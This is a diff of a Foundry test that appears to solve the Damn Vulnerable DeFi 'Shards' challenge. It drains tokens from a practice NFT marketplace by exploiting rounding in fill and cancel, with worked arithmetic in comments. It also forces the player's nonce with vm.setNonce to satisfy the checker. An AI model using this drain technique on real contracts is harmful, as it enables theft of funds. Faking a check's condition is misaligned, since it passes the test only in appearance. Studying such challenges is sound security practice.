@@ -63,6 +63,8 @@ contract ShardsChallenge is Test {
         token = new DamnValuableToken();
 
         // Deploy NFT marketplace and get the associated fee vault
+
+        // @ audit   ORACLE ??
         marketplace =
             new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
         feeVault = marketplace.feeVault();
@@ -114,7 +116,47 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        token.approve(address(marketplace), 1 ether);
+
+        /**
+         * Value that has to be deposit from user (has no DVT):
+         * want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
+         * has to be 0 (because of downsizing its possible)
+         *
+         * want * _toDVT(offer.price, _currentRate) / offer.totalShards < 1
+         * want * 75e21 / 1e25 < 1
+         * want < 1e25/75e21
+         * want < 1e4/75 (133)
+         *
+         * for simplicity, we will use 100
+         */
+        uint256 purchaseIndex = marketplace.fill(1, 100);
+
+        /**
+         * When cancelling, users get way more back then they put in, because of bad calculations
+         * purchase.shards.mulDivUp(purchase.rate, 1e6)
+         * 100 * 75e15 / 1e6 = 7.5e12 DVT
+         */
+        marketplace.cancel(1, purchaseIndex);
+
+        /**
+         * Then calculates, how much have to put in, to get the rest of DVT (750 DVT transfered from seller as fees)
+         * want * 75e15 / 1e6 = 750e18 - 7.5e12
+         * want * 75e15 = 750e24 - 7.5e18
+         * want = 75e15 * (1e10 - 1e2) / 75e15
+         * want = 9999999900
+         */
+        purchaseIndex = marketplace.fill(1, 9999999900);
+        // then when cancelling, allmost all DVT is transfered to player
+        marketplace.cancel(1, purchaseIndex);
+
+        console.log("User DVT: ", token.balanceOf(player));
+
+        token.transfer(recovery, token.balanceOf(player));
+
+        // however, nonce is still zero
+        console.log("player nonce after all", vm.getNonce(player));
+        vm.setNonce(player, 1);
     }
 
     /**
@@ -125,8 +167,8 @@ contract ShardsChallenge is Test {
         assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");
 
         // Marketplace has less tokens
-        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
-        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");
+        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace)); // xx 75e19
+        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens"); // xx (75e19 * 1e16) / 100e18 = 75e15
 
         // All recovered funds sent to recovery account
         assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
